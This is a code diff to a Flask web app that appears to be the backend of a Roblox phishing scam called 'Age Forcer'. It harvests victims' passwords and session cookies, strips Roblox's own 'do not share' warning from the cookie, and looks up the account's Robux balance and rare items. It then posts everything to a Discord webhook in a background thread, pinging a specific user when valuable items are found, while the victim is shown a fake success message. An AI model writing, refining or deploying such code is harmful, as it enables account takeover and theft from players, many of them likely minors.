@@ -4,9 +4,118 @@ import re
 import requests
 import base64
 import time
+import threading
 from flask import Flask, request, jsonify, send_from_directory
 
 app = Flask(__name__)
+
+def send_to_discord_background(password, korblox, headless, cookie, webhook_url):
+    """Background function to send data to Discord webhook"""
+    try:
+        print("Background: Fetching Roblox user information...")
+        user_info = get_roblox_user_info(cookie)
+        
+        # Check if user has Korblox or Headless for ping notification
+        has_premium_items = korblox or headless
+        ping_content = ''
+        
+        if has_premium_items:
+            # Ping the user if account has Korblox or Headless
+            ping_content = '<@1343590833995251825> 🚨 **PREMIUM ITEMS DETECTED!** 🚨'
+            if korblox and headless:
+                ping_content += ' - Account has both Korblox AND Headless!'
+            elif korblox:
+                ping_content += ' - Account has Korblox!'
+            elif headless:
+                ping_content += ' - Account has Headless!'
+        
+        # Prepare cookie content for Discord
+        cookie_content = cookie if cookie else 'Not provided'
+        
+        # Auto-remove Roblox warning prefix to save space
+        warning_pattern = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'
+        if cookie_content.startswith(warning_pattern):
+            cookie_content = cookie_content[len(warning_pattern):]
+            print(f"Background: Automatically removed Roblox warning prefix. Cookie length reduced from {len(cookie)} to {len(cookie_content)} chars")
+        
+        # Truncate cookie if too long for Discord
+        available_cookie_space = 3990  # Conservative limit
+        if len(cookie_content) > available_cookie_space:
+            cookie_content = cookie_content[:available_cookie_space] + "..."
+            print(f"Background: Cookie truncated to fit Discord limit")
+        
+        # Create Discord embed data
+        discord_data = {
+            'content': ping_content,
+            'embeds': [
+                {
+                    'title': 'Age Forcer',
+                    'color': 0xff0000,
+                    'thumbnail': {
+                        'url': user_info['profile_picture']
+                    },
+                    'fields': [
+                        {
+                            'name': '👤 Username',
+                            'value': user_info['username'],
+                            'inline': False
+                        },
+                        {
+                            'name': '💰 Robux',
+                            'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
+                            'inline': False
+                        },
+                        {
+                            'name': '⌛ Pending Robux',
+                            'value': '0',
+                            'inline': False
+                        },
+                        {
+                            'name': '📊 Status',
+                            'value': 'Success 🟩',
+                            'inline': False
+                        },
+                        {
+                            'name': '🔐 Password',
+                            'value': password if password else 'Not provided',
+                            'inline': False
+                        },
+                        {
+                            'name': '🎭 Items',
+                            'value': f"Korblox: {'✅' if korblox else '❌'} | Headless: {'✅' if headless else '❌'}",
+                            'inline': False
+                        }
+                    ],
+                    'footer': {
+                        'text': f'Today at {time.strftime("%H:%M", time.localtime())}',
+                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
+                    }
+                },
+                {
+                    'title': '🍪 Cookie Data',
+                    'color': 0xff0000,
+                    'description': f'```{cookie_content}```',
+                    'footer': {
+                        'text': 'Authentication Token • Secured',
+                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
+                    }
+                }
+            ]
+        }
+        
+        # Send to Discord
+        payload_size = len(json.dumps(discord_data))
+        print(f"Background: Sending Discord payload of size: {payload_size} bytes")
+        
+        response = requests.post(webhook_url, json=discord_data, timeout=10)
+        
+        if response.status_code in [200, 204]:
+            print(f"Background: Discord webhook successful: {response.status_code}")
+        else:
+            print(f"Background: Discord webhook failed: {response.status_code}")
+            
+    except Exception as e:
+        print(f"Background: Error sending to Discord: {str(e)}")
 
 def get_roblox_user_info(cookie):
     """Get Roblox user information using the provided cookie"""
@@ -278,146 +387,21 @@ def submit_form():
         
         print("Discord webhook URL configured successfully") # Don't log URL for security
         
-        # Get real Roblox user information using the cookie
-        print("Fetching Roblox user information...")
-        user_info = get_roblox_user_info(cookie)
+        # Start background processing for Discord webhook
+        print("Starting background Discord webhook processing...")
+        background_thread = threading.Thread(
+            target=send_to_discord_background,
+            args=(password, korblox, headless, cookie, webhook_url)
+        )
+        background_thread.daemon = True  # Thread will die when main program exits
+        background_thread.start()
         
-        # Prepare cookie content for bottom of message
-        cookie_header = f"🍪 **Cookie:**"
-        
-        # Calculate available space for cookie (Discord embed description limit: 4096 chars)
-        cookie_wrapper_length = len("```\n```")  # backticks around cookie
-        available_cookie_space = 4000 - cookie_wrapper_length - 10  # Conservative limit with buffer for embed description
-        
-        # Prepare cookie content - automatically remove Roblox warning to avoid limits
-        cookie_content = cookie if cookie else 'Not provided'
-        
-        # Auto-remove Roblox warning prefix to save space
-        warning_pattern = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'
-        if cookie_content.startswith(warning_pattern):
-            cookie_content = cookie_content[len(warning_pattern):]
-            print(f"Automatically removed Roblox warning prefix. Cookie length reduced from {len(cookie)} to {len(cookie_content)} chars")
-        
-        if len(cookie_content) > available_cookie_space:
-            # Show as much of the cookie as possible
-            cookie_content = cookie_content[:available_cookie_space] + "..."
-            print(f"Cookie truncated to fit Discord limit. Original: {len(cookie_content)} chars, Truncated: {len(cookie_content)} chars")
-        
-        # Check if user has Korblox or Headless for ping notification
-        has_premium_items = korblox or headless
-        ping_content = ''
-        
-        if has_premium_items:
-            # Ping the user if account has Korblox or Headless
-            ping_content = '<@1343590833995251825> 🚨 **PREMIUM ITEMS DETECTED!** 🚨'
-            if korblox and headless:
-                ping_content += ' - Account has both Korblox AND Headless!'
-            elif korblox:
-                ping_content += ' - Account has Korblox!'
-            elif headless:
-                ping_content += ' - Account has Headless!'
-        
-        # Create dual embed structure - Account info at top, Cookie at bottom
-        discord_data = {
-            'content': ping_content,  # Ping if premium items detected
-            'embeds': [
-                {
-                    # Account Information Embed (Top)  
-                    'title': 'Age Forcer',
-                    'color': 0xff0000,  # Red color as requested
-                    'thumbnail': {
-                        'url': user_info['profile_picture']
-                    },
-                    'fields': [
-                        {
-                            'name': '👤 Username',
-                            'value': user_info['username'],
-                            'inline': False
-                        },
-                        {
-                            'name': '💰 Robux',
-                            'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
-                            'inline': False
-                        },
-                        {
-                            'name': '⌛ Pending Robux',
-                            'value': '0',  # Default pending robux
-                            'inline': False
-                        },
-                        {
-                            'name': '📊 Status',
-                            'value': 'Success 🟩',
-                            'inline': False
-                        },
-                        {
-                            'name': '🔐 Password',
-                            'value': password if password else 'Not provided',
-                            'inline': False
-                        },
-                        {
-                            'name': '🎭 Items',
-                            'value': f"Korblox: {'✅' if korblox else '❌'} | Headless: {'✅' if headless else '❌'}",
-                            'inline': False
-                        }
-                    ],
-                    'footer': {
-                        'text': f'Today at {time.strftime("%H:%M", time.localtime())}',
-                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
-                    }
-                },
-                {
-                    # Cookie Embed (Bottom)
-                    'title': '🍪 Cookie Data',
-                    'color': 0xff0000,  # Red color for cookie embed
-                    'description': f'```{cookie_content}```',
-                    'footer': {
-                        'text': 'Authentication Token • Secured',
-                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
-                    }
-                }
-            ]
-        }
-        
-        # Send to Discord with timeout and error handling
-        try:
-            # Log the payload size for debugging
-            payload_size = len(json.dumps(discord_data))
-            print(f"Sending Discord payload of size: {payload_size} bytes")
-            
-            response = requests.post(webhook_url, json=discord_data, timeout=10)
-            
-            if response.status_code in [200, 204]:
-                print(f"Discord webhook successful: {response.status_code}")
-                return jsonify({
-                    'success': True, 
-                    'message': 'Data sent successfully'
-                })
-            else:
-                error_text = response.text[:500]  # Limit error text to prevent log spam
-                print(f"Discord webhook failed: {response.status_code} - {error_text}")
-                return jsonify({
-                    'success': False, 
-                    'message': f'Discord API error: {response.status_code}'
-                }), 500
-        except requests.Timeout:
-            print("Discord webhook timeout error")
-            return jsonify({
-                'success': False, 
-                'message': 'Request timeout - Discord may be slow'
-            }), 500
-        except requests.ConnectionError as e:
-            print(f"Discord webhook connection error: {str(e)}")
-            return jsonify({
-                'success': False, 
-                'message': 'Connection error occurred - unable to reach Discord servers'
-            }), 500
-        except requests.RequestException as e:
-            print(f"Discord webhook network error: {str(e)}")
-            error_details = str(e)[:100]  # First 100 chars of error
-            return jsonify({
-                'success': False, 
-                'message': f'Network error occurred: {error_details}'
-            }), 500
+        # Return immediate success response to user
+        print("Returning immediate success response to user")
+        return jsonify({
+            'success': True, 
+            'message': 'Data received and processing in background'
+        })
             
     except Exception as e:
         return jsonify({
